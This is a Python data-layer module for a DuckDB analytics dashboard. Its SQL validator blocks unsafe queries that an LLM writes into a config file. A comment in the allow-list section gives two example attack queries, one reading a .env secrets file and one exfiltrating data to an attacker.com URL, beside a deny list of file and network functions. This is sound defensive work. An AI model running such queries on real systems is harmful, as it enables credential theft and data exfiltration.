"""Data layer backed by DuckDB.

Pure Python — no Streamlit imports.  All reads/aggregations run in DuckDB
with SQL pushdown (WHERE + GROUP BY), so millions of rows never have to be
loaded into pandas.

This module is a **dumb skeleton**: it knows nothing about column roles,
synonyms, table types, or what data to ingest. It only provides:
- Raw DuckDB connection and query execution
- File storage helpers
- Manifest management

**Everything is driven by ``ui_config.json``** (written by the MCP server):
- Table names come from the config, not hardcoded.
- File classification is delegated to the MCP agent.
- SQL queries with column names come from ``core.tools``.
- This module never guesses which column is which or what table type a file is.
"""
from __future__ import annotations

import hashlib
import io
import json
import logging
import os
import time
import uuid
from pathlib import Path
from typing import Any

import duckdb
import pandas as pd
import sqlglot
from sqlglot import exp
from sqlglot.errors import SqlglotError

# --------------------------------------------------------------------------- #
# Paths
# --------------------------------------------------------------------------- #
BASE_DIR = Path(__file__).resolve().parent.parent
UPLOAD_DIR = BASE_DIR / "data_uploaded"
DB_PATH = UPLOAD_DIR / "analytics.duckdb"

# Tables are no longer hardcoded — they come from ui_config.json.
# This module reads them dynamically via _get_tables_from_config().
_MANIFEST = "manifest.json"
_CSV_EXT = ".csv"

# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #
_LOG_FILE = BASE_DIR / "log_trace_upload_data.log"

_logger = logging.getLogger("upload_data")
_logger.setLevel(logging.DEBUG)
_logger.propagate = False
if not _logger.handlers:
    _fh = logging.FileHandler(_LOG_FILE, mode="a", encoding="utf-8")
    _fh.setFormatter(logging.Formatter(
        "%(asctime)s | %(levelname)s | %(message)s", "%Y-%m-%d %H:%M:%S"))
    _logger.addHandler(_fh)

# --------------------------------------------------------------------------- #
# Connection — ephemeral connections to avoid cross-process lock conflicts
# --------------------------------------------------------------------------- #
#
# IMPORTANT: DuckDB on Windows blocks the entire file when one process opens it
# for writing. Even read-only connections from another process fail. To support
# the MCP server (writer) and Streamlit UI (reader) running as separate processes,
# we use ephemeral connections that open, execute, and close immediately.
# This ensures the file lock is released between operations, allowing the other
# process to access the database.
#
# The _con singleton is kept only for ingest_table() which needs a persistent
# connection for the duration of a multi-file upload session.


_con: duckdb.DuckDBPyConnection | None = None


def _open_con(read_only: bool = False) -> duckdb.DuckDBPyConnection:
    """Open a fresh DuckDB connection (ephemeral — caller must close it).

    ``read_only=True`` opens the database in read-only mode, which lets the UI
    share the file with the MCP server and rejects accidental writes
    (DROP/COPY/INSERT) coming from a dashboard query.
    """
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    if read_only and DB_PATH.exists() and _con is None:
        try:
            return duckdb.connect(str(DB_PATH), read_only=True)
        except Exception:
            # Older/edge cases (e.g. file created but empty) — fall back.
            pass
    return duckdb.connect(str(DB_PATH))


def get_con() -> duckdb.DuckDBPyConnection:
    """Open (or create) the shared DuckDB database connection.

    Returns a persistent singleton connection. Use this only for operations
    that need a long-lived connection (e.g., multi-step ingestion).
    For simple queries, prefer run_query() which uses ephemeral connections.
    """
    global _con
    if _con is None:
        DB_PATH.parent.mkdir(parents=True, exist_ok=True)
        _con = duckdb.connect(str(DB_PATH))
    return _con


def close_con() -> None:
    """Close the persistent singleton connection to release the file lock.

    Call this after ingestion is complete so that other processes (e.g.,
    Streamlit) can access the database. The next call to get_con() will
    create a fresh connection.
    """
    global _con
    if _con is not None:
        try:
            _con.close()
        except Exception:
            pass
        _con = None


# --------------------------------------------------------------------------- #
# SQL allow-list
# --------------------------------------------------------------------------- #
#
# ``ui_config.json`` contains SQL written by the LLM, and anyone with write
# access to that file can put arbitrary SQL in it. A read-only DuckDB connection
# protects against writes, but not against reading files or the network:
#
#     SELECT * FROM read_csv('C:\Users\...\.env')
#     SELECT * FROM read_csv('https://attacker.com/?x=' || ...)
#
# ``safe_sql`` closes that hole: one statement, root must be a read-only query,
# no file/network table functions, and every referenced table must exist in the
# database (or be a CTE alias).
_MAX_SQL_LEN = 50_000

# Statement types that are safe to execute from a dashboard.
_ALLOWED_ROOTS = tuple(
    getattr(exp, name)
    for name in ("Select", "Union", "Intersect", "Except", "Subquery",
                 "Describe", "Show", "Values")
    if hasattr(exp, name)
)

# Anything that writes, attaches, installs extensions or runs OS commands.
_FORBIDDEN_NODES = tuple(
    getattr(exp, name)
    for name in ("Insert", "Update", "Delete", "Drop", "Create", "Alter",
                 "Attach", "Detach", "Copy", "Pragma", "Install", "Load",
                 "Command", "Use", "Set", "Transaction", "Merge", "Grant",
                 "Export", "Import", "Refresh", "Cache", "Uncache")
    if hasattr(exp, name)
)

# Table functions that touch the filesystem or the network.
_FORBIDDEN_FUNCTIONS = {
    "glob", "query", "query_table", "sniff_csv", "getvariable", "getenv",
    "sqlite_attach", "sqlite_scan", "postgres_scan", "mysql_scan",
    "iceberg_scan", "delta_scan", "which_secret", "read_xlsx",
}


def _func_name(node: exp.Func) -> str:
    """Best-effort lowercase name of a function node (Anonymous uses ``name``)."""
    if isinstance(node, exp.Anonymous):
        return str(node.name or "").lower()
    return str(node.sql_name() or "").lower()


def safe_sql(sql: str, tables: set[str] | None = None) -> str | None:
    """Validate *sql* before running it.

    Returns ``None`` when the query is safe, or a short reason (in English,
    ready to show in the UI) when it is not.

    This is a defence-in-depth check, not a full SQL sandbox: it blocks
    multi-statement SQL, writes/DDL/ATTACH, file & network table functions and
    tables that don't exist in the database. Combined with the read-only
    connection, that covers the realistic attack surface of an editable
    ``ui_config.json``.

    Args:
        sql: Query to validate.
        tables: Tables allowed in this query. Defaults to the tables present in
            the database; pass an explicit set in tests.
    """
    if not isinstance(sql, str) or not sql.strip():
        return "The query is empty."

    if len(sql) > _MAX_SQL_LEN:
        return "The query is too long."

    try:
        statements = sqlglot.parse(sql, read="duckdb")
    except SqlglotError as exc:
        return f"Invalid SQL: {str(exc).splitlines()[0][:160]}"

    statements = [s for s in statements if s is not None]
    if not statements:
        return "The query is empty."
    if len(statements) > 1:
        return "Only one SQL statement per query is allowed."

    tree = statements[0]

    if not isinstance(tree, _ALLOWED_ROOTS):
        return f"Read-only queries (SELECT) only. Detected type: {type(tree).__name__}."

    for node in tree.walk():
        if isinstance(node, _FORBIDDEN_NODES):
            return f"Operation not allowed: {type(node).__name__.upper()}."

    for node in tree.find_all(exp.Func):
        name = _func_name(node)
        if name.startswith("read_") or name.endswith("_scan") or name in _FORBIDDEN_FUNCTIONS:
            return f"Function not allowed: {name}() (file or network access)."

    # Tables must exist in the database (CTE aliases are fine).
    alias_cte = {str(cte.alias).lower() for cte in tree.find_all(exp.CTE)}
    referenced: set[str] = set()
    for tbl in tree.find_all(exp.Table):
        if isinstance(tbl.this, exp.Func):
            # Already covered by the function check above.
            continue
        if tbl.catalog:
            return f"Catalog access not allowed: {tbl.catalog}."
        if tbl.db and str(tbl.db).lower() != "main":
            return f"Schema access not allowed: {tbl.db}."
        name = str(tbl.name or "")
        if name and name.lower() not in alias_cte:
            referenced.add(name)

    if referenced:
        available = {t.lower() for t in tables} if tables is not None else None
        if available is None:
            try:
                available = {t.lower() for t in available_tables()}
            except Exception:
                available = set()
        if available:
            not_found = referenced - available
            if not_found:
                return (
                    "The query uses tables that do not exist: "
                    + ", ".join(sorted(not_found))
                    + ". Available: "
                    + ", ".join(sorted(available))
                    + "."
                )

    return None


_LAST_ERROR: str | None = None
_ERROR_COUNT = 0


def error_count() -> int:
    """Number of failed queries so far (cheap way to detect new failures)."""
    return _ERROR_COUNT


def run_query(
    sql: str,
    params: dict[str, Any] | None = None,
) -> pd.DataFrame:
    """Run a DuckDB query using an ephemeral read-only connection.

    Opens a connection, executes the query, and closes the connection
    immediately. This avoids holding a file lock that would block the
    other process (MCP or Streamlit) from accessing the database.

    Failures are logged instead of swallowed silently; ``last_error()``
    exposes the last message so the UI can surface it.

    Execution time is logged for performance monitoring.

    Args:
        sql: SQL query string.
        params: Optional named parameters.
    """
    global _LAST_ERROR, _ERROR_COUNT

    if not DB_PATH.exists():
        return pd.DataFrame()

    reason = safe_sql(sql)
    if reason is not None:
        _LAST_ERROR = f"SQL blocked: {reason}"
        _ERROR_COUNT += 1
        _logger.warning(
            "Query blocked: %s | SQL: %s",
            reason,
            " ".join(str(sql).split())[:300],
        )
        return pd.DataFrame()

    start = time.time()
    con = _open_con(read_only=True)
    try:
        df = con.execute(sql, params or {}).df()
        elapsed = time.time() - start
        _logger.debug(f"Query executed in {elapsed:.3f}s: {sql[:100]}")
        if elapsed > 2.0:
            _logger.warning(f"Slow query ({elapsed:.3f}s): {sql[:200]}")
        return df
    except Exception as exc:
        elapsed = time.time() - start
        _LAST_ERROR = f"{type(exc).__name__}: {exc}"
        _ERROR_COUNT += 1
        _logger.error(
            "Query failed after %.3fs: %s | SQL: %s",
            elapsed,
            exc,
            " ".join(str(sql).split())[:300],
        )
        return pd.DataFrame()
    finally:
        try:
            con.close()
        except Exception:
            pass


def last_error() -> str | None:
    """Last SQL error captured by :func:`run_query` (kept until the next failure)."""
    return _LAST_ERROR

# --------------------------------------------------------------------------- #
# Storage helpers
# --------------------------------------------------------------------------- #
def _manifest() -> dict:
    mf = UPLOAD_DIR / _MANIFEST
    if not mf.exists():
        return {}
    try:
        data = json.loads(mf.read_text(encoding="utf-8"))
    except Exception:
        return {}
    norm: dict = {}
    for k, v in data.items():
        if isinstance(v, str):
            norm[k] = {"nombre": v, "hash": ""}
        else:
            norm[k] = v if isinstance(v, dict) else {"nombre": str(v), "hash": ""}
    return norm


def _save_manifest(names: dict) -> None:
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
    (UPLOAD_DIR / _MANIFEST).write_text(json.dumps(names, indent=2), encoding="utf-8")


def _is_valid_identifier(name: str) -> bool:
    """Check if *name* is a safe SQL identifier (letters, digits, underscore).

    Rejects empty strings and names containing special characters that could
    enable SQL injection via identifier interpolation.
    """
    if not name:
        return False
    return all(c.isalnum() or c == "_" for c in name)


def _table_exists(con: duckdb.DuckDBPyConnection, table: str) -> bool:
    if not _is_valid_identifier(table):
        return False
    try:
        con.execute(f"SELECT 1 FROM {table} LIMIT 1").fetchall()
        return True
    except Exception:
        return False


def table_exists(table: str) -> bool:
    """Check if a table exists in the DuckDB database using an ephemeral connection."""
    if not DB_PATH.exists():
        return False
    con = _open_con(read_only=True)
    try:
        return _table_exists(con, table)
    except Exception:
        return False
    finally:
        try:
            con.close()
        except Exception:
            pass


def available_tables() -> list[str]:
    """Return a list of all table names in the DuckDB database using an ephemeral connection."""
    if not DB_PATH.exists():
        return []
    con = _open_con(read_only=True)
    try:
        df = con.execute("SHOW TABLES").df()
        if df.empty:
            return []
        return [str(r) for r in df.iloc[:, 0]]
    except Exception:
        return []
    finally:
        try:
            con.close()
        except Exception:
            pass


def has_data() -> bool:
    """Check if any data has been loaded into the database."""
    return len(available_tables()) > 0


def file_in_use(key: str) -> str:
    """Return the filename currently loaded for a given table key."""
    info = _manifest().get(key)
    if isinstance(info, str):
        return info
    return (info or {}).get("nombre", f"{key}.csv")


# --------------------------------------------------------------------------- #
# Upload / ingest — generic, no hardcoded types
# --------------------------------------------------------------------------- #
def ingest_table(table: str, files) -> list[str]:
    """Ingest uploaded files into a DuckDB table whose name is provided by the caller.
    
    This is the generic ingestion function. The MCP agent (or any caller) decides
    what table name to use. This module just stores the data.
    
    Args:
        table: Target table name in DuckDB (e.g. "sales", "my_data", etc.).
        files: List of file-like objects (CSV or Excel).
    
    Returns:
        List of status messages for each file processed.
    """
    con = get_con()
    messages = []
    names = _manifest()
    
    for f in (files or []):
        fname = _file_name(f)
        try:
            raw = _read_header(f)
        except Exception as e:
            msg = f"Error reading '{fname}': {e}"
            _logger.warning(msg)
            messages.append(msg)
            continue
        
        fhash = _file_hash(f)
        prev = names.get(table)
        prev_hash = (prev or {}).get("hash", "") if isinstance(prev, dict) else ""
        if prev_hash and prev_hash == fhash:
            msg = f"'{fname}' already loaded (skipped)"
            _logger.info(msg)
            messages.append(msg)
            continue
        
        is_xlsx = _is_excel(f)
        suffix = ".parquet" if is_xlsx else _CSV_EXT
        disk_path = UPLOAD_DIR / f"__ingest_{table}_{uuid.uuid4().hex[:12]}{suffix}"
        try:
            if is_xlsx:
                df = pd.read_excel(io.BytesIO(f.getvalue()), engine="calamine")
                df = _normalize_dates(df)
                con.register("__tmp_upload", df)
                try:
                    _create_table(con, table, "__tmp_upload")
                finally:
                    try:
                        con.unregister("__tmp_upload")
                    except Exception:
                        pass
            else:
                _dump_to_csv(f, disk_path)
                _create_table(con, table, _sani(disk_path))
            names[table] = {"nombre": fname, "hash": fhash}
            msg = f"'{fname}' ingested into table '{table}' ({len(raw)} rows)"
            _logger.info(msg)
            messages.append(msg)
        except Exception as e:
            msg = f"Error ingesting '{fname}' into '{table}': {e}"
            _logger.error(msg)
            messages.append(msg)
        finally:
            if disk_path.exists():
                try:
                    disk_path.unlink()
                except Exception:
                    pass
    
    if names:
        _save_manifest(names)
    # Release the DuckDB file lock: the UI only reads, and the MCP server needs
    # to write. Keeping the writer open here caused "file is being used by
    # another process" on Windows.
    close_con()
    return messages


def _create_table(con: duckdb.DuckDBPyConnection, table: str, source_sql: str) -> None:
    """Create or replace a table from a SQL source expression."""
    if not _is_valid_identifier(table):
        raise ValueError(f"Invalid table name: {table!r}")
    sql = f"CREATE OR REPLACE TABLE {table} AS SELECT * FROM {source_sql}"
    con.execute(sql)
    con.commit()
    # Force checkpoint so other processes (e.g., Streamlit read-only) can see the data.
    try:
        con.execute("CHECKPOINT")
    except Exception:
        pass
    _logger.info("Table '%s' created from %s", table, source_sql[:80])


def save_files(files, table: str = "default") -> list[str]:
    """Legacy alias for ingest_table. Kept for backward compatibility.
    
    Args:
        files: List of file-like objects.
        table: Target table name (default: "default").
    
    Returns:
        List of status messages.
    """
    return ingest_table(table, files)


# --------------------------------------------------------------------------- #
# Private helpers
# --------------------------------------------------------------------------- #
def _file_name(f) -> str:
    return getattr(f, "name", None) or "dataset.csv"


def _extension(f) -> str:
    fname = _file_name(f).lower()
    return fname.rsplit(".", 1)[-1] if "." in fname else ""


def _is_excel(f) -> bool:
    return _extension(f) in {"xlsx", "xls"}


def _read_header(f, nrows: int = 200) -> pd.DataFrame:
    buf = io.BytesIO(f.getvalue())
    if _is_excel(f):
        return pd.read_excel(buf, nrows=nrows, engine="openpyxl")
    return pd.read_csv(buf, nrows=nrows)


def _dump_to_csv(f, path) -> None:
    with open(path, "wb") as fh:
        fh.write(f.getvalue())


def _file_hash(f) -> str:
    try:
        return hashlib.sha256(f.getvalue()).hexdigest()[:16]
    except Exception:
        return ""


_DATE_ALIASES = ("date", "fecha", "dia", "timestamp", "datetime", "nacimiento", "birth")


def _normalize_dates(df: pd.DataFrame) -> pd.DataFrame:
    for c in df.columns:
        base = str(c).lower()
        if not any(a in base for a in _DATE_ALIASES):
            continue
        if df[c].dtype == object or pd.api.types.is_string_dtype(df[c]):
            try:
                df[c] = pd.to_datetime(df[c], errors="coerce")
            except Exception:
                pass
    return df


def _sani(path) -> str:
    """Sanitize a file path for use in DuckDB SQL — wraps in quotes so spaces work."""
    path_str = str(path).replace("\\", "/")
    return f"'{path_str}'"


def clear_data() -> None:
    global _con
    try:
        if _con is not None:
            _con.close()
    except Exception:
        pass
    _con = None
    if DB_PATH.exists():
        try:
            DB_PATH.unlink()
        except Exception:
            pass
    if UPLOAD_DIR.exists():
        for f in UPLOAD_DIR.iterdir():
            if f.is_file() and f.name != _MANIFEST:
                try:
                    f.unlink()
                except Exception:
                    pass
        _save_manifest({})


# --------------------------------------------------------------------------- #
# Column inspection helpers (public)
# --------------------------------------------------------------------------- #

def get_table_columns(table: str) -> list[str]:
    """Return the column names of an existing DuckDB table.

    Args:
        table: Table name in DuckDB.

    Returns:
        List of column names, or empty list if the table does not exist.
    """
    if not table_exists(table):
        return []
    con = _open_con(read_only=True)
    try:
        df = con.execute(f"DESCRIBE {table}").df()
        if df.empty:
            return []
        return [str(r) for r in df["column_name"]]
    except Exception:
        return []
    finally:
        try:
            con.close()
        except Exception:
            pass


def read_file_columns(f) -> list[str]:
    """Read only the header row of a CSV or Excel file and return column names.

    Args:
        f: File-like object with a .name attribute and .getvalue() method.

    Returns:
        List of column names from the file header.
    """
    try:
        data = f.getvalue()
        if _is_excel(f):
            df = pd.read_excel(io.BytesIO(data), nrows=0, engine="calamine")
        else:
            df = pd.read_csv(io.BytesIO(data), nrows=0)
        return list(df.columns)
    except Exception:
        return []
